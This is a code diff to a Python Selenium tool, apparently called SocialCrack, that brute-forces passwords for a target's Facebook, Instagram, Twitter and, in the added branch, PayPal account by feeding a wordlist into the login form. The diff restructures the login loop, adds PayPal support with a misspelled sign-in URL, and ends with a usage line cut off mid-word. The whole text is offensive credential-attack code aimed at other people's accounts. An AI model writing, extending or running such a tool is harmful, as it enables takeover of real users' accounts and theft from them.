@@ -27,16 +27,16 @@ class brute_bot(object):
     def bruteforcer(self):
         driver = self.driver
         pass_found = False
+        driver.get(self.site)
+        email_box = driver.find_element_by_xpath(f"//input[@name='{self.email_field}']")
+        email_box.clear()
+        email_box.send_keys(self.email)
 
         if sys.argv[1] != "twitter":
             while not pass_found:
-                driver.get(self.site)
                 time.sleep(3)
                 for i in self.password:
                     try:
-                        email_box = driver.find_element_by_xpath(f"//input[@name='{self.email_field}']")
-                        email_box.clear()
-                        email_box.send_keys(self.email)   
                         password_box = driver.find_element_by_xpath(f"//input[@name='{self.pass_field}']")
                         password_box.clear()
                         password_box.send_keys(i)
@@ -49,15 +49,12 @@ class brute_bot(object):
                         if pass_found == True: 
                             print(f'Password is >> {old} ')
                             break
+
         else:
             while not pass_found:
-                driver.get(self.site)
                 time.sleep(3)
                 for i in self.password:
                     try:
-                        email_box = driver.find_element_by_class_name(f'{self.email_field}')
-                        email_box.clear()
-                        email_box.send_keys(self.email)   
                         password_box = driver.find_element_by_class_name(f'{self.pass_field}')
                         password_box.clear()
                         password_box.send_keys(i)
@@ -93,8 +90,7 @@ def main_menu():
         print("Waking up BOT...")
         efield = 'email'
         pfield = 'pass'
-        time.sleep(2)
-        email1 = str(input("\nThe Email Address/ Phone NUMBER of the target >> "))
+        email1 = str(input("\nThe ID of the target >> "))
         target = open(sys.argv[2], 'r')
         readpass = target.readlines()
         execute = brute_bot(email1, readpass, site, efield, pfield)
@@ -106,7 +102,6 @@ def main_menu():
         print("Waking up BOT...")
         efield = 'username'
         pfield = 'password'
-        time.sleep(2)
         email1 = str(input("\nThe Username of the Target >> "))
         target = open(sys.argv[2], 'r')
         readpass = target.readlines()
@@ -119,8 +114,19 @@ def main_menu():
         print("Waking up BOT...")
         efield = 'js-username-field'
         pfield = 'js-password-field'
-        time.sleep(2)
         email1 = str(input("\nThe Username/Email of the Target >> "))
+        target = open(sys.argv[2])
+        readpass = target.readlines()
+        execute = brute_bot(email1, readpass, site, efield, pfield)
+        execute.bruteforcer()
+
+    elif sys.argv[1] == "paypal":
+        site = "https://www.paylpal.com/signin/"
+        print(banner)
+        print("Waking up BOT...")
+        efield = 'login_email'
+        pfield = 'login_password'
+        email1 = str(input("\nThe Email of the Target >> "))
         target = open(sys.argv[2])
         readpass = target.readlines()
         execute = brute_bot(email1, readpass, site, efield, pfield)
@@ -141,4 +147,5 @@ if __name__ == "__main__":
             Facebook:     python3 SocialCrack.py facebook /path/to/your/wordlist.txt
             Instagram:    python3 SocialCrack.py instagram /path/to/your/wordlist.txt
             Twitter:      python3 SocialCrack.py twitter /path/to/your/wordlist.txt
+            PayPal:       python3 So
         """)
